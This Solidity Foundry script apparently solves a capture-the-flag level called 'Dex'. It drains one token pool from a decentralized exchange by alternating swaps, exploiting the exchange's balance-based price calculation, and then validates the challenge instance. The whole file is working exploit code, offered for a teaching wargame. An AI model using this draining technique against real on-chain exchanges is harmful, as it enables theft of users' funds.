// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Dex} from "../src/22-Dex.sol";
import {DexFactory} from "../src/DexFactory.sol";
import {Script, console} from "forge-std/Script.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract DexSolution is Script {
    Dex public dexLevel;
    address payable instanceAddress = payable(0x3CA3b6EB63D457BD9Df028fE1bCe5BBFD7a5B83B);
    address public publicKey = vm.envAddress("PUBLIC_KEY");

    function run() external {
        dexLevel = Dex(instanceAddress);

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address token1 = dexLevel.token1();
        address token2 = dexLevel.token2();

        IERC20(token1).approve(address(dexLevel), type(uint256).max);
        IERC20(token2).approve(address(dexLevel), type(uint256).max);

        while (true) {
            uint256 dexToken1Balance = dexLevel.balanceOf(token1, address(dexLevel));
            uint256 dexToken2Balance = dexLevel.balanceOf(token2, address(dexLevel));
            uint256 playerToken1Balance = dexLevel.balanceOf(token1, publicKey);
            uint256 playerToken2Balance = dexLevel.balanceOf(token2, publicKey);

            if (dexToken1Balance == 0 || dexToken2Balance == 0) {
                break; // We've drained one of the tokens
            }

            if (playerToken1Balance > 0) {
                uint256 swapAmount = playerToken1Balance < dexToken1Balance ? playerToken1Balance : dexToken1Balance;
                dexLevel.swap(token1, token2, swapAmount);
            } else if (playerToken2Balance > 0) {
                uint256 swapAmount = playerToken2Balance < dexToken2Balance ? playerToken2Balance : dexToken2Balance;
                dexLevel.swap(token2, token1, swapAmount);
            } else {
                break; // No tokens to swap
            }
        }

        vm.stopBroadcast();

        validate();
    }

    function validate() internal {
        bool isValidated = new DexFactory().validateInstance(instanceAddress, publicKey);
        console.log("Challenge Completed: %s", isValidated);
    }
}
